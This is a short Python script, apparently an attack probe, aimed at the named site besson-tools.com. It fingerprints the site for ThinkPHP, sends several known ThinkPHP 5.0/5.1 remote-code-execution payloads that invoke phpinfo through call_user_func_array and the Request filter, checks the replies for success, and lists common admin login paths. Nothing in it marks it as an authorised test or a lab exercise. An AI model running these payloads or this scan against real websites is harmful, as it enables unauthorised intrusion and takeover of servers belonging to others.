#!/usr/bin/env python3
"""besson-tools.com ThinkPHP probe"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
HOST = "http://besson-tools.com"

def fetch(url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.geturl(), r.read(150000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

print("=== home ===")
code, final, body = fetch(HOST + "/")
print("home:", code, final, "size", len(body))
gens = re.findall(r'(ThinkPHP|generator|X-Powered[^<]{0,30})', body, re.I)
print("gens:", gens[:3])

print("\n=== TP RCE probes ===")
tests = [
    ("/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1", "tp5.0"),
    ("/index.php?s=/index/\\think\\Request/input&filter[]=phpinfo&data=1", "tp5.0-req"),
    ("/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "tp5.0b"),
    ("/index.php?s=index/\\think\\Request/input&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1", "tp5.1"),
]
for u, tag in tests:
    code, final, body = fetch(HOST + u)
    hit = "phpinfo" in body.lower() or "PHP Version" in body or "Configuration" in body and "php.ini" in body
    print("  %s: %s size=%d RCE=%s" % (tag, code, len(body), hit))

print("\n=== admin paths ===")
for p in ["/admin", "/admin.php", "/index.php/admin", "/manage.php", "/Admin/Login/index.html"]:
    code, final, body = fetch(HOST + p)
    print("  %s: %s size=%d %s" % (p, code, len(body), final[:40]))
